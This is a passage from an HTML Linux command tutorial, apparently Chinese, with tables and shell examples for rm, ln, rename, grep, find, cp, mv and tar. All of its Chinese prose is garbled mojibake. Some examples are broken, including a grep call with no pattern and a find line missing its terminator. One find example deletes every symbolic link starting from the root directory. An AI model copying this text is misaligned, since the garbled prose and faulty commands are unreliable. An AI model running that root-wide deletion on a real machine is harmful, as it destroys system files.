<td>å¼ºåˆ¶åˆ é™¤ï¼Œå¿½ç•¥ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œæ— éœ€æç¤º</td>
</tr>
<tr>
<td>-r</td>
<td>é€’å½’åœ°åˆ é™¤ç›®å½•ä¸‹çš„å†…å®¹ï¼Œåˆ é™¤æ–‡ä»¶å¤¹æ—¶å¿…é¡»åŠ æ­¤å‚æ•°</td>
</tr>
</tbody>
</table>
<p>####lnï¼š å»ºç«‹é“¾æ¥æ–‡ä»¶</p>
<p>è½¯é“¾æ¥ï¼šln -s æºæ–‡ä»¶ é“¾æ¥æ–‡ä»¶</p>
<p>ç¡¬é“¾æ¥ï¼šln æºæ–‡ä»¶ é“¾æ¥æ–‡ä»¶</p>
<p>è½¯é“¾æ¥ç±»ä¼¼äºWindowsä¸‹çš„å¿«æ·æ–¹å¼ï¼Œå¦‚æœè½¯é“¾æ¥æ–‡ä»¶å’Œæºæ–‡ä»¶ä¸åœ¨åŒä¸€ä¸ªç›®å½•ï¼Œæºæ–‡ä»¶è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ã€‚</p>
<p>ç¡¬é“¾æ¥åªèƒ½é“¾æ¥æ™®é€šæ–‡ä»¶ä¸èƒ½é“¾æ¥ç›®å½•ã€‚ ä¸¤ä¸ªæ–‡ä»¶å ç”¨ç›¸åŒå¤§å°çš„ç¡¬ç›˜ç©ºé—´ï¼Œå³ä½¿åˆ é™¤äº†æºæ–‡ä»¶ï¼Œé“¾æ¥æ–‡ä»¶è¿˜æ˜¯å­˜åœ¨ï¼Œæ‰€ä»¥-sé€‰é¡¹æ˜¯æ›´å¸¸è§çš„å½¢å¼ã€‚</p>
<h4 id="renameï¼šä¿®æ”¹æ–‡ä»¶å">renameï¼šä¿®æ”¹æ–‡ä»¶å</h4>
<p>renameå‘½ä»¤æ˜¯åœ¨Linuxå’ŒUnixç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºæ‰¹é‡é‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ã€‚åŸºæœ¬è¯­æ³•:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rename [é€‰é¡¹] è¡¨è¾¾å¼ æ›¿æ¢çš„å­—ç¬¦ æ–‡ä»¶...</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤é€‰é¡¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"> rename [options] &lt;expression&gt; &lt;replacement&gt; &lt;file&gt;...</span><br><span class="line"></span><br><span class="line">Rename files.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -v, --verbose       explain what is being <span class="keyword">done</span></span><br><span class="line"> -s, --symlink       act on the target of symlinks</span><br><span class="line"> -n, --no-act        <span class="keyword">do</span> not make any changes</span><br><span class="line"> -o, --no-overwrite  don<span class="string">&#x27;t overwrite existing files</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> -h, --help          display this help</span></span><br><span class="line"><span class="string"> -V, --version       display version</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">For more details see rename(1).</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢æ˜¯renameå‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-v, --verbose : æ˜¾ç¤ºè¯¦ç»†çš„æ“ä½œä¿¡æ¯ </span><br><span class="line">-s, --symlink : å¯¹ç¬¦å·é“¾æ¥ç›®æ ‡è¿›è¡Œæ“ä½œ</span><br><span class="line">-h, --<span class="built_in">help</span> : æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º </span><br><span class="line">-V, --version : æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º</span><br></pre></td></tr></table></figure>
<p>å®ä¾‹1ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename -v file afile file0?</span><br><span class="line">`file01<span class="string">&#x27; -&gt; `afile01&#x27;</span></span><br><span class="line">`file02<span class="string">&#x27; -&gt; `afile02&#x27;</span></span><br><span class="line">`file03<span class="string">&#x27; -&gt; `afile03&#x27;</span></span><br><span class="line">`file04<span class="string">&#x27; -&gt; `afile04&#x27;</span></span><br><span class="line">`file05<span class="string">&#x27; -&gt; `afile05&#x27;</span></span><br><span class="line">`file06<span class="string">&#x27; -&gt; `afile06&#x27;</span></span><br><span class="line">`file07<span class="string">&#x27; -&gt; `afile07&#x27;</span></span><br><span class="line">`file08<span class="string">&#x27; -&gt; `afile08&#x27;</span></span><br><span class="line">`file09<span class="string">&#x27; -&gt; `afile09&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å®ä¾‹2ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#rename file afile *</span><br><span class="line">[root@rocky8:~]#<span class="built_in">ls</span></span><br><span class="line">aafile01  aafile09  afile017  afile025  afile033  afile041  afile049  afile057  afile065  afile073  afile081  afile089  afile097......</span><br></pre></td></tr></table></figure>
<h4 id="grepï¼šæ–‡æœ¬æœç´¢">grepï¼šæ–‡æœ¬æœç´¢</h4>
<p>Linuxç³»ç»Ÿä¸­grepå‘½ä»¤æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œgrepå…è®¸å¯¹æ–‡æœ¬æ–‡ä»¶è¿›è¡Œæ¨¡å¼æŸ¥æ‰¾ã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…æ¨¡å¼ï¼Œ grepæ‰“å°åŒ…å«æ¨¡å¼çš„æ‰€æœ‰è¡Œã€‚</p>
<p>grepä¸€èˆ¬æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep [-é€‰é¡¹] <span class="string">&#x27;æœç´¢å†…å®¹ä¸²&#x27;</span> æ–‡ä»¶å</span><br></pre></td></tr></table></figure>
<p>åœ¨grepå‘½ä»¤ä¸­è¾“å…¥å­—ç¬¦ä¸²å‚æ•°æ—¶ï¼Œæœ€å¥½å¼•å·æˆ–åŒå¼•å·æ‹¬èµ·æ¥ã€‚ä¾‹å¦‚ï¼š<code>grep 'a' 1.txt</code>ã€‚</p>
<p>åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾å‰ç¼€æœ‰testå­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep <span class="built_in">test</span> <span class="built_in">test</span>* <span class="comment">#æŸ¥æ‰¾å‰ç¼€æœ‰testçš„æ–‡ä»¶åŒ…å«testå­—ç¬¦ä¸²çš„æ–‡ä»¶  </span></span><br><span class="line">testfile1:This a Linux testfile! <span class="comment">#åˆ—å‡ºtestfile1 æ–‡ä»¶ä¸­åŒ…å«testå­—ç¬¦çš„è¡Œ  </span></span><br><span class="line">testfile_2:This is a linux testfile! <span class="comment">#åˆ—å‡ºtestfile_2 æ–‡ä»¶ä¸­åŒ…å«testå­—ç¬¦çš„è¡Œ  </span></span><br><span class="line">testfile_2:Linux <span class="built_in">test</span> <span class="comment">#åˆ—å‡ºtestfile_2 æ–‡ä»¶ä¸­åŒ…å«testå­—ç¬¦çš„è¡Œ </span></span><br></pre></td></tr></table></figure>
<p>ä»¥é€’å½’çš„æ–¹å¼æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼ŒæŸ¥æ‰¾æŒ‡å®šç›®å½•/etc/acpi åŠå…¶å­ç›®å½•ï¼ˆå¦‚æœå­˜åœ¨å­ç›®å½•çš„è¯ï¼‰ä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸²&quot;update&quot;çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²æ‰€åœ¨è¡Œçš„å†…å®¹ï¼Œä½¿ç”¨çš„å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -r update /etc/acpi <span class="comment">#ä»¥é€’å½’çš„æ–¹å¼æŸ¥æ‰¾â€œetc/acpiâ€  </span></span><br><span class="line"><span class="comment">#ä¸‹åŒ…å«â€œupdateâ€çš„æ–‡ä»¶  </span></span><br><span class="line">/etc/acpi/ac.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of IO.)  </span><br><span class="line">Rather than  </span><br><span class="line">/etc/acpi/resume.d/85-anacron.sh:# (Things like the slocate updatedb cause a lot of  </span><br><span class="line">IO.) Rather than  </span><br><span class="line">/etc/acpi/events/thinkpad-cmos:action=/usr/sbin/thinkpad-keys--update </span><br></pre></td></tr></table></figure>
<p>åå‘æŸ¥æ‰¾ã€‚å‰é¢å„ä¸ªä¾‹å­æ˜¯æŸ¥æ‰¾å¹¶æ‰“å°å‡ºç¬¦åˆæ¡ä»¶çš„è¡Œï¼Œé€šè¿‡&quot;-v&quot;å‚æ•°å¯ä»¥æ‰“å°å‡ºä¸ç¬¦åˆæ¡ä»¶è¡Œçš„å†…å®¹ã€‚</p>
<p>æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å« test çš„æ–‡ä»¶ä¸­ä¸åŒ…å«test çš„è¡Œï¼Œæ­¤æ—¶ï¼Œä½¿ç”¨çš„å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ grep -v <span class="built_in">test</span>* <span class="comment">#æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«test çš„æ–‡ä»¶ä¸­ä¸åŒ…å«test çš„è¡Œ  </span></span><br><span class="line">testfile1:helLinux!  </span><br><span class="line">testfile1:Linis a free Unix-<span class="built_in">type</span> operating system.  </span><br><span class="line">testfile1:Lin  </span><br><span class="line">testfile_1:HELLO LINUX!  </span><br><span class="line">testfile_1:LINUX IS A FREE UNIX-TYPE OPTERATING SYSTEM.  </span><br><span class="line">testfile_1:THIS IS A LINUX TESTFILE!  </span><br><span class="line">testfile_2:HELLO LINUX!  </span><br><span class="line">testfile_2:Linux is a free unix-type opterating system.  </span><br></pre></td></tr></table></figure>
<h4 id="æŸ¥æ‰¾æ–‡ä»¶ï¼šfind">æŸ¥æ‰¾æ–‡ä»¶ï¼šfind</h4>
<p>å¸¸ç”¨ç”¨æ³•ï¼š</p>
<table>
<thead>
<tr>
<th>å‘½ä»¤</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>find ./ -name <a href="http://test.sh">test.sh</a></td>
<td>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰åä¸ºtest.shçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find ./ -name â€˜*.shâ€™</td>
<td>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰åç¼€ä¸º.shçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find ./ -name â€œ[A-Z]*â€</td>
<td>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ä»¥å¤§å†™å­—æ¯å¼€å¤´çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find /tmp -size 2M</td>
<td>æŸ¥æ‰¾åœ¨/tmp ç›®å½•ä¸‹ç­‰äº2Mçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find /tmp -size +2M</td>
<td>æŸ¥æ‰¾åœ¨/tmp ç›®å½•ä¸‹å¤§äº2Mçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find /tmp -size -2M</td>
<td>æŸ¥æ‰¾åœ¨/tmp ç›®å½•ä¸‹å°äº2Mçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find ./ -size +4k -size -5M</td>
<td>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹å¤§äº4kï¼Œå°äº5Mçš„æ–‡ä»¶</td>
</tr>
<tr>
<td>find ./ -perm 0777</td>
<td>æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æƒé™ä¸º 777 çš„æ–‡ä»¶æˆ–ç›®å½•</td>
</tr>
</tbody>
</table>
<p>Linux findå‘½ä»¤ç”¨æ¥åœ¨æŒ‡å®šç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ã€‚ä»»ä½•ä½äºå‚æ•°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½å°†è¢«è§†ä¸ºæ¬²æŸ¥æ‰¾çš„ç›®å½•åã€‚å¦‚æœä½¿ç”¨è¯¥å‘½ä»¤æ—¶ï¼Œä¸è®¾ç½®ä»»ä½•å‚æ•°ï¼Œåˆ™findå‘½ä»¤å°†åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾å­ç›®å½•ä¸æ–‡ä»¶ã€‚å¹¶ä¸”å°†æŸ¥æ‰¾åˆ°çš„å­ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨è¿›è¡Œæ˜¾ç¤ºã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find path -option [ -<span class="built_in">print</span> ] [ -<span class="built_in">exec</span> -ok <span class="built_in">command</span> ] &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><strong>å¸¸ç”¨å‚æ•°è¯´æ˜</strong> :</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-perm xxxxï¼šæƒé™ä¸º xxxxçš„æ–‡ä»¶æˆ–ç›®å½•</p>
</li>
<li class="lvl-2">
<p>-userï¼š æŒ‰ç…§æ–‡ä»¶å±ä¸»æ¥æŸ¥æ‰¾æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p>-size n : nå•ä½,b:512ä½å…ƒç»„çš„åŒºå—,c:å­—å…ƒæ•°,k:kilo bytes,w:äºŒä¸ªä½å…ƒç»„</p>
</li>
<li class="lvl-2">
<p>-mount, -xdev : åªæ£€æŸ¥å’ŒæŒ‡å®šç›®å½•åœ¨åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸‹çš„æ–‡ä»¶ï¼Œé¿å…åˆ—å‡ºå…¶å®ƒæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-amin n : åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«è¯»å–è¿‡</p>
</li>
<li class="lvl-2">
<p>-anewer file : æ¯”æ–‡ä»¶ file æ›´æ™šè¢«è¯»å–è¿‡çš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-atime n : åœ¨è¿‡å»nå¤©å†…è¢«è¯»å–è¿‡çš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-cmin n : åœ¨è¿‡å» n åˆ†é’Ÿå†…è¢«ä¿®æ”¹è¿‡</p>
</li>
<li class="lvl-2">
<p>-cnewer file :æ¯”æ–‡ä»¶ file æ›´æ–°çš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-ctime n : åœ¨è¿‡å»nå¤©å†…è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-empty : ç©ºçš„æ–‡ä»¶</p>
</li>
<li class="lvl-2">
<p>-gid n or -group name : gid æ˜¯ n æˆ–æ˜¯ group åç§°æ˜¯ name</p>
</li>
<li class="lvl-2">
<p>-ipath p, -path p : è·¯å¾„åç§°ç¬¦åˆ p çš„æ–‡ä»¶ï¼Œipath ä¼šå¿½ç•¥å¤§å°å†™</p>
</li>
<li class="lvl-2">
<p>-name name, -iname name : æ–‡ä»¶åç§°ç¬¦åˆ name çš„æ–‡ä»¶ã€‚iname ä¼šå¿½ç•¥å¤§å°å†™</p>
</li>
<li class="lvl-2">
<p>-type æŸ¥æ‰¾æŸä¸€ç±»å‹çš„æ–‡ä»¶ï¼š</p>
<ul class="lvl-2">
<li class="lvl-4">b - å—è®¾å¤‡æ–‡ä»¶</li>
<li class="lvl-4">d - ç›®å½•</li>
<li class="lvl-4">c - å­—ç¬¦è®¾å¤‡æ–‡ä»¶</li>
<li class="lvl-4">p - ç®¡é“æ–‡ä»¶</li>
<li class="lvl-4">l - ç¬¦å·é“¾æ¥æ–‡ä»¶</li>
<li class="lvl-4">f - æ™®é€šæ–‡ä»¶</li>
</ul>
</li>
<li class="lvl-2">
<p>-exec å‘½ä»¤å{} \ (æ³¨æ„ï¼šâ€œ}â€å’Œâ€œ\â€ä¹‹é—´æœ‰ç©ºæ ¼)</p>
</li>
</ul>
<p>findå®ä¾‹ï¼š</p>
<p>æ˜¾ç¤ºå½“å‰ç›®å½•ä¸­å¤§äº20å­—èŠ‚å¹¶ä»¥.cç»“å°¾çš„æ–‡ä»¶å</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&quot;*.c&quot;</span> -size +20c </span><br></pre></td></tr></table></figure>
<p>å°†ç›®å‰ç›®å½•å…¶å…¶ä¸‹å­ç›®å½•ä¸­æ‰€æœ‰ä¸€èˆ¬æ–‡ä»¶åˆ—å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f</span><br></pre></td></tr></table></figure>
<p>å°†ç›®å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹æ‰€æœ‰æœ€è¿‘ 20 å¤©å†…æ›´æ–°è¿‡çš„æ–‡ä»¶åˆ—å‡º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -ctime -20</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾/var/logç›®å½•ä¸­æ›´æ”¹æ—¶é—´åœ¨7æ—¥ä»¥å‰çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åœ¨åˆ é™¤ä¹‹å‰è¯¢é—®å®ƒä»¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/log -<span class="built_in">type</span> f -mtime +7 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾å‰ç›®å½•ä¸­æ–‡ä»¶å±ä¸»å…·æœ‰è¯»ã€å†™æƒé™ï¼Œå¹¶ä¸”æ–‡ä»¶æ‰€å±ç»„çš„ç”¨æˆ·å’Œå…¶ä»–ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>æŸ¥æ‰¾ç³»ç»Ÿä¸­æ‰€æœ‰æ–‡ä»¶é•¿åº¦ä¸º0çš„æ™®é€šæ–‡ä»¶ï¼Œå¹¶åˆ—å‡ºå®ƒä»¬çš„å®Œæ•´è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size 0 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>ä»æ ¹ç›®å½•æŸ¥æ‰¾ç±»å‹ä¸ºç¬¦å·é“¾æ¥çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶åˆ é™¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; \</span><br></pre></td></tr></table></figure>
<p>ä»å½“å‰ç›®å½•æŸ¥æ‰¾ç”¨æˆ·tomçš„æ‰€æœ‰æ–‡ä»¶å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -user tom</span><br></pre></td></tr></table></figure>
<p>åœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶ä»¥.docç»“å°¾ï¼Œä¸”æ›´æ”¹æ—¶é—´åœ¨3å¤©ä»¥ä¸Šçš„æ–‡ä»¶ï¼Œæ‰¾åˆ°ååˆ é™¤ï¼Œå¹¶ä¸”ç»™å‡ºåˆ é™¤æç¤º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name *.doc  -mtime +3 -ok <span class="built_in">rm</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰é“¾æ¥æ–‡ä»¶ï¼Œå¹¶ä¸”ä»¥é•¿æ ¼å¼æ˜¾ç¤ºæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> l -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p>åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶åæœ‰ä¸€ä¸ªå°å†™å­—æ¯ã€ä¸€ä¸ªå¤§å†™å­—æ¯ã€ä¸¤ä¸ªæ•°å­—ç»„æˆï¼Œä¸”æ‰©å±•åä¸º.docçš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -name <span class="string">&#x27;[a-z][A-Z][0-9][0-9].doc&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="æ‹·è´æ–‡ä»¶ï¼šcp">æ‹·è´æ–‡ä»¶ï¼šcp</h4>
<p>cpå‘½ä»¤çš„åŠŸèƒ½æ˜¯å°†ç»™å‡ºçš„æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•ä¸­ï¼Œç›¸å½“äºDOSä¸‹çš„copyå‘½ä»¤ã€‚</p>
<p>å¸¸ç”¨é€‰é¡¹è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>è¯¥é€‰é¡¹é€šå¸¸åœ¨å¤åˆ¶ç›®å½•æ—¶ä½¿ç”¨ï¼Œå®ƒä¿ç•™é“¾æ¥ã€æ–‡ä»¶å±æ€§ï¼Œå¹¶é€’å½’åœ°å¤åˆ¶ç›®å½•ï¼Œç®€å•è€Œè¨€ï¼Œä¿æŒæ–‡ä»¶åŸæœ‰å±æ€§ã€‚</td>
</tr>
<tr>
<td>-f</td>
<td>å·²ç»å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶è€Œä¸æç¤º</td>
</tr>
<tr>
<td>-i</td>
<td>äº¤äº’å¼å¤åˆ¶ï¼Œåœ¨è¦†ç›–ç›®æ ‡æ–‡ä»¶ä¹‹å‰å°†ç»™å‡ºæç¤ºè¦æ±‚ç”¨æˆ·ç¡®è®¤</td>
</tr>
<tr>
<td>-r</td>
<td>è‹¥ç»™å‡ºçš„æºæ–‡ä»¶æ˜¯ç›®å½•æ–‡ä»¶ï¼Œåˆ™cpå°†é€’å½’å¤åˆ¶è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶å¿…é¡»ä¸ºä¸€ä¸ªç›®å½•åã€‚</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºæ‹·è´è¿›åº¦</td>
</tr>
<tr>
<td>-l</td>
<td>åˆ›å»ºç¡¬é“¾æ¥(hard link)ï¼Œè€Œéå¤åˆ¶æ–‡ä»¶æœ¬èº«</td>
</tr>
<tr>
<td>-s</td>
<td>å¤åˆ¶æˆä¸ºç¬¦å·é“¾æ¥ (symbolic link)ï¼Œç›¸å½“äºæ‰¹é‡åˆ›å»ºå¿«æ·æ–¹å¼</td>
</tr>
<tr>
<td>-u</td>
<td>è‹¥ destination æ¯” source æ—§æ‰å‡çº§ destination ï¼</td>
</tr>
</tbody>
</table>
<p>cp vim_configure/ code/ -ivr æŠŠæ–‡ä»¶å¤¹ vim_configure æ‹·è´åˆ° code ç›®å½•é‡Œã€‚</p>
<h4 id="ç§»åŠ¨æ–‡ä»¶ï¼šmv">ç§»åŠ¨æ–‡ä»¶ï¼šmv</h4>
<p>mvå‘½ä»¤ç”¨æ¥ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç»™æ–‡ä»¶æˆ–ç›®å½•é‡å‘½åã€‚</p>
<p>å¸¸ç”¨é€‰é¡¹è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-f</td>
<td>ç¦æ­¢äº¤äº’å¼æ“ä½œï¼Œå¦‚æœ‰è¦†ç›–ä¹Ÿä¸ä¼šç»™å‡ºæç¤º</td>
</tr>
<tr>
<td>-i</td>
<td>ç¡®è®¤äº¤äº’æ–¹å¼æ“ä½œï¼Œå¦‚æœmvæ“ä½œå°†å¯¼è‡´å¯¹å·²å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶çš„è¦†ç›–ï¼Œç³»ç»Ÿä¼šè¯¢é—®æ˜¯å¦é‡å†™ï¼Œè¦æ±‚ç”¨æˆ·å›ç­”ä»¥é¿å…è¯¯è¦†ç›–æ–‡ä»¶</td>
</tr>
<tr>
<td>-v</td>
<td>æ˜¾ç¤ºç§»åŠ¨è¿›åº¦</td>
</tr>
</tbody>
</table>
<p>mvå¯ä»¥ä¿®æ”¹æ–‡ä»¶åï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 test.txt</span><br><span class="line">[root@rocky8:~]#<span class="built_in">mv</span> test.txt <span class="built_in">test</span></span><br><span class="line">[root@rocky8:~]#ll</span><br><span class="line">total 4</span><br><span class="line">-rw-------. 1 root root 1256 Feb 18 21:18 anaconda-ks.cfg</span><br><span class="line">-rw-r--r--. 1 root root    0 Feb 19 11:43 <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h4 id="å½’æ¡£ç®¡ç†ï¼štar">å½’æ¡£ç®¡ç†ï¼štar</h4>
<p>æ­¤å‘½ä»¤å¯ä»¥æŠŠä¸€ç³»åˆ—æ–‡ä»¶å½’æ¡£åˆ°ä¸€ä¸ªå¤§æ–‡ä»¶ä¸­ï¼Œä¹Ÿå¯ä»¥æŠŠæ¡£æ¡ˆæ–‡ä»¶è§£å¼€ä»¥æ¢å¤æ•°æ®ã€‚</p>
<p>tarä½¿ç”¨æ ¼å¼ tar [å‚æ•°] æ‰“åŒ…æ–‡ä»¶å æ–‡ä»¶</p>
<p>tarå‘½ä»¤å‚æ•°å¾ˆç‰¹æ®Šï¼Œå…¶å‚æ•°å‰é¢å¯ä»¥ä½¿ç”¨â€œ-â€ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ã€‚</p>
<p>å¸¸ç”¨å‚æ•°ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>ç”Ÿæˆæ¡£æ¡ˆæ–‡ä»¶ï¼Œåˆ›å»ºæ‰“åŒ…æ–‡ä»¶</td>
</tr>
<tr>
<td>-v</td>
<td>åˆ—å‡ºå½’æ¡£è§£æ¡£çš„è¯¦ç»†è¿‡ç¨‹ï¼Œæ˜¾ç¤ºè¿›åº¦</td>
</tr>
<tr>
<td>-f</td>
<td>æŒ‡å®šæ¡£æ¡ˆæ–‡ä»¶åç§°ï¼Œfåé¢ä¸€å®šæ˜¯.taræ–‡ä»¶ï¼Œæ‰€ä»¥å¿…é¡»æ”¾é€‰é¡¹æœ€å</td>
</tr>
<tr>
<td>-t</td>
<td>åˆ—å‡ºæ¡£æ¡ˆä¸­åŒ…å«çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>-x</td>
<td>è§£å¼€æ¡£æ¡ˆæ–‡ä»¶</td>
</tr>
</tbody>
</table>
<p>æ³¨æ„ï¼šé™¤äº†féœ€è¦æ”¾åœ¨å‚æ•°çš„æœ€åï¼Œå…¶å®ƒå‚æ•°çš„é¡ºåºä»»æ„ã€‚</p>
